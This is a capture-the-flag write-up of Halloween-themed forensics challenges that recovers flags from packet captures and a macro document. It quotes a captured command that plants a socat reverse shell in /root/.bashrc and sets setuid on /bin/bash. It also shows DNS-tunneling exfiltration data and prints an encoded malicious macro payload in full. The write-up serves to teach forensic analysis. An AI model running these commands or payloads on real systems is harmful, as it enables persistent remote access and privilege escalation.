# **Wrong Spooky Season**
```
"I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us.
I was wrong." Now there is an internal breach in the `Spooky Network` and you need to find out what happened. 
Analyze the the network traffic and find how the scary ghosts got in and what they did.
```

First challenge, they give us one pcap file. There're two ways you can solve this.

*Unintended solution:*

You can simply use `strings` to see what inside the pcap file.

```
┌──(kali㉿devilmachine)-[/mnt/d/WSL_LAB/Workplace/htb-boo/forensics_wrong_spooky_season]
└─$ strings *.pcap
...
echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash
VDc0c
'"FO
'"FO
I;r?
ls -lha
'"FO
'"FO
I;rtotal 20K
drwxr-xr-x 1 root root 4.0K Oct 10 17:28 .
drwxr-xr-x 1 root root 4.0K Oct 10 17:28 ..
```

So there is a base64 encoded string. Reverse it then decode, we have the flag.

*Intended solution:*

Open the pcap file then follow TCP stream to the last. Here is the result:

~pic~


## FLAG: HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
___

# **Trick or Breach**
```
Our company has been working on a secret project for almost a year. None knows about the subject, although rumor is that it is about an old Halloween legend where an old witch in the woods invented a potion to bring pumpkins to life, but in a more up-to-date approach.
Unfortunately, we learned that malicious actors accessed our network in a massive cyber attack. Our security team found that the hack had occurred when a group of children came into the office's security external room for trick or treat.
One of the children was found to be a paid actor and managed to insert a USB into one of the security personnel's computers, which allowed the hackers to gain access to the company's systems.
We only have a network capture during the time of the incident. Can you find out if they stole the secret project?
```

We have another pcap file in this challenge. Let's see what inside:

~pic~

If you notice, there're some strange URLs that were captured during the transmission. This is DNS Tunneling - one of the real world attack. Those strange URLs that you can see in wireshark were encoded or encrypted. Let's find out by extracting those URLs.

I filtered the query IP then copied whole data to a file

~pic~

```
1	0.000000	192.168.1.10	147.182.172.189	DNS	126	Standard query 0xa49f A 504b0304140008080800a52c47550000000000000000000000.pumpkincorp.com
3	1.062969	192.168.1.10	147.182.172.189	DNS	126	Standard query 0xdd23 A 0018000000786c2f64726177696e67732f64726177696e6731.pumpkincorp.com
5	2.069426	192.168.1.10	147.182.172.189	DNS	126	Standard query 0xcf3f A 2e786d6c9dd05d6ec2300c07f013ec0e55de695a181343145e.pumpkincorp.com
7	3.155776	192.168.1.10	147.182.172.189	DNS	126	Standard query 0xb53f A d04e300ee0256e1b918fca0ea3dc7ed14a36697b011e6dcb3f.pumpkincorp.com
9	4.236338	192.168.1.10	147.182.172.189	DNS	126	Standard query 0x6195 A f9efcd6e74b6f84462137c23eab212057a15b4f15d230eef6f.pumpkincorp.com
11	5.254457	192.168.1.10	147.182.172.189	DNS	126	Standard query 0x5634 A b395283882d76083c7465c90c56efbb41935adcfbca722ed7b.pumpkincorp.com
13	6.298151	192.168.1.10	147.182.172.189	DNS	126	Standard query 0xacfd A 5ea7b2117d8cc35a4a563d3ae0320ce8d3b40de420a6923aa9.pumpkincorp.com
15	7.319849	192.168.1.10	147.182.172.189	DNS	126	Standard query 0x8482 A 09ce497656ceabea45f240089a7bc4b89f26e2eac1039a03e3.pumpkincorp.com
```

Then I wrote this script to extract the encoded parts.

```py
f = open('qry.txt','r').readlines()
data = [i.split()[-1].replace('.pumpkincorp.com','') for i in f]
data = "".join(data)
wb = bytes.fromhex("".join(data))
wf = open('sus','wb')
wf.write(wb)
```
## FLAG: HTB{M4g1c_c4nn0t_pr3v3nt_d4t4_br34ch}
___
# **Halloween Invitation**
```
An email notification pops up. It's from your theater group. Someone decided to throw a party. The invitation looks awesome, but there is something suspicious about this document. Maybe you should take a look before you rent your banana costume.
```

We were given a suspicious file named `invitation.docm`. When I opened it up, it said there was a macro content.  There are two ways you can get this macro. First you can use `olevba` - a powerful tool to extract macro from .doc file. Second, you can just simply open it in doc file xD

I chose first and here is the result:

~pic~

That's the suspicious content which we need to decode.

```py
import base64
flag = ""
flag += "74 65 66 122 65 68 48 65 74 119 65 51 65 68 99 65 76 103 65 51 65 68 81 65 76 103 "
flag += "65 120 65 68 107 65 79 65 65 117 65 68 85 65 77 103 65 54 65 68 103 65 77 65 65 52 "
flag += "65 68 65 65 74 119 65 55 65 67 81 65 97 81 65 57 65 67 99 65 90 65 65 48 65 68 77 "
flag += "65 89 103 66 106 65 71 77 65 78 103 66 107 65 67 48 65 77 65 65 48 65 68 77 65 90 "
flag += "103 65 121 65 68 81 65 77 65 65 53 65 67 48 65 78 119 66 108 65 71 69 65 77 103 65 "
flag += "122 65 71 69 65 77 103 66 106 65 67 99 65 79 119 65 107 65 72 65 65 80 81 65 110 65 "
flag += "71 103 65 100 65 66 48 65 72 65 65 79 103 65 118 65 67 56 65 74 119 65 55 65 67 81 "
flag += "65 100 103 65 57 65 69 107 65 98 103 66 50 65 71 56 65 97 119 66 108 65 67 48 65 85 "
flag += "103 66 108 65 72 77 65 100 65 66 78 65 71 85 65 100 65 66 111 65 71 56 65 90 65 65 "
flag += "103 65 67 48 65 86 81 66 122 65 71 85 65 81 103 66 104 65 72 77 65 97 81 66 106 65 "
flag += "70 65 65 89 81 66 121 65 72 77 65 97 81 66 117 65 71 99 65 73 65 65 116 65 70 85 65 "
flag += "99 103 66 112 65 67 65 65 74 65 66 119 65 67 81 65 99 119 65 118 65 71 81 65 78 65 "
flag += "65 122 65 71 73 65 89 119 66 106 65 68 89 65 90 65 65 103 65 67 48 65 83 65 66 108 "
flag += "65 71 69 65 90 65 66 108 65 72 73 65 99 119 65 103 65 69 65 65 101 119 65 105 65 69 "
flag += "69 65 100 81 66 48 65 71 103 65 98 119 66 121 65 71 107 65 101 103 66 104 65 72 81 "
flag += "65 97 81 66 118 65 71 52 65 73 103 65 57 65 67 81 65 97 81 66 57 65 68 115 65 100 "
flag += "119 66 111 65 71 107 65 98 65 66 108 65 67 65 65 75 65 65 107 65 72 81 65 99 103 66 "
flag += "49 65 71 85 65 75 81 66 55 65 67 81 65 89 119 65 57 65 67 103 65 83 81 66 117 65 72 "
flag += "89 65 98 119 66 114 65 71 85 65 76 81 66 83 65 71 85 65 99 119 66 48 65 69 48 65 90 "
flag += "81 66 48 65 71 103 65 98 119 66 107 65 67 65 65 76 81 66 86 65 72 77 65 90 81 66 67 "
flag += "65 71 69 65 99 119 66 112 65 71 77 65 85 65 66 104 65 72 73 65 99 119 66 112 65 71 "
flag += "52 65 90 119 65 103 65 67 48 65 86 81 66 121 65 71 107 65 73 65 65 107 65 72 65 65 "
flag += "74 65 66 122 65 67 56 65 77 65 65 48 65 68 77 65 90 103 65 121 65 68 81 65 77 65 65 "
flag += "53 65 67 65 65 76 81 66 73 65 71 85 65 89 81 66 107 65 71 85 65 99 103 66 122 65 67 "
flag += "65 65 81 65 66 55 65 67 73 65 81 81 66 49 65 72 81 65 97 65 66 118 65 72 73 65 97 "
flag += "81 66 54 65 71 69 65 100 65 66 112 65 71 56 65 98 103 65 105 65 68 48 65 74 65 66 "
flag += "112 65 72 48 65 75 81 65 55 65 71 107 65 90 103 65 103 65 67 103 65 74 65 66 106 65 "
flag += "67 65 65 76 81 66 117 65 71 85 65 73 65 65 110 65 69 52 65 98 119 66 117 65 71 85 "
flag += "65 74 119 65 112 65 67 65 65 101 119 65 107 65 72 73 65 80 81 66 112 65 71 85 65 101 "
flag += "65 65 103 65 67 81 65 89 119 65 103 65 67 48 65 82 81 66 121 65 72 73 65 98 119 66 "
flag += "121 65 69 69 65 89 119 66 48 65 71 107 65 98 119 66 117 65 67 65 65 85 119 66 48 65 "
flag += "71 56 65 99 65 65 103 65 67 48 65 82 81 66 121 65 72 73 65 98 119 66 121 65 70 89 "
flag += "65 89 81 66 121 65 71 107 65 89 81 66 105 65 71 119 65 90 81 65 103 65 71 85 65 79 "
flag += "119 65 107 65 72 73 65 80 81 66 80 65 72 85 65 100 65 65 116 65 70 77 65 100 65 66 "
flag += "121 65 71 107 65 98 103 66 110 65 67 65 65 76 81 66 74 65 71 52 65 99 65 66 49 65 "
flag += "72 81 65 84 119 66 105 65 71 111 65 90 81 66 106 65 72 81 65 73 65 65 107 65 72 73 "
flag += "65 79 119 65 107 65 72 81 65 80 81 66 74 65 71 52 65 100 103 66 118 65 71 115 65 90 "
flag += "81 65 116 65 70 73 65 90 81 66 122 65 72 81 65 84 81 66 108 65 72 81 65 97 65 66 118 "
flag += "65 71 81 65 73 65 65 116 65 70 85 65 99 103 66 112 65 67 65 65 74 65 66 119 65 67 "
flag += "81 65 99 119 65 118 65 68 99 65 90 81 66 104 65 68 73 65 77 119 66 104 65 68 73 65 "
flag += "89 119 65 103 65 67 48 65 84 81 66 108 65 72 81 65 97 65 66 118 65 71 81 65 73 65 "
flag += "66 81 65 69 56 65 85 119 66 85 65 67 65 65 76 81 66 73 65 71 85 65 89 81 66 107 65 "
flag += "71 85 65 99 103 66 122 65 67 65 65 81 65 66 55 65 67 73 65 81 81 66 49 65 72 81 65 "
flag += "97 65 66 118 65 72 73 65 97 81 66 54 65 71 69 65 100 65 66 112 65 71 56 65 98 103 "
flag += "65 105 65 68 48 65 74 65 66 112 65 72 48 65 73 65 65 116 65 69 73 65 98 119 66 107 "
flag += "65 72 107 65 73 65 65 111 65 70 115 65 85 119 66 53 65 72 77 65 100 65 66 108 65 71 "
flag += "48 65 76 103 66 85 65 71 85 65 101 65 66 48 65 67 52 65 82 81 66 117 65 71 77 65 98 "
flag += "119 66 107 65 71 107 65 98 103 66 110 65 70 48 65 79 103 65 54 65 70 85 65 86 65 66 "
flag += "71 65 68 103 65 76 103 66 72 65 71 85 65 100 65 66 67 65 72 107 65 100 65 66 108 65 "
flag += "72 77 65 75 65 65 107 65 71 85 65 75 119 65 107 65 72 73 65 75 81 65 103 65 67 48 "
flag += "65 97 103 66 118 65 71 107 65 98 103 65 103 65 67 99 65 73 65 65 110 65 67 107 65 "
flag += "102 81 65 103 65 72 77 65 98 65 66 108 65 71 85 65 99 65 65 103 65 68 65 65 76 103 "
flag += "65 52 65 72 48 65 83 65 66 85 65 69 73 65 101 119 65 49 65 72 85 65 99 65 65 122 65 "
flag += "72 73 65 88 119 65 122 65 68 81 65 78 81 66 53 65 70 56 65 98 81 65 48 65 71 77 65 "
flag += "99 103 65 119 65 68 85 65 102 81 65 61"
#print(flag)
adu = flag.split()
hehe = ""
for i in adu:
    hehe += chr(int(i))
#print(hehe)
#bruh = flag.replace(" ","")
print(base64.b64decode(hehe).decode("UTF-8"))
```
## FLAG: HTB{5up3r_345y_m4cr05}

___
# **POOF**

## FLAG: HTB{n3v3r_tru5t_4ny0n3_3sp3c14lly_dur1ng_h4ll0w33n}

___
# **Downgrade**
## FLAG: HTB{4n0th3r_d4y_4n0th3r_d0wngr4d3...}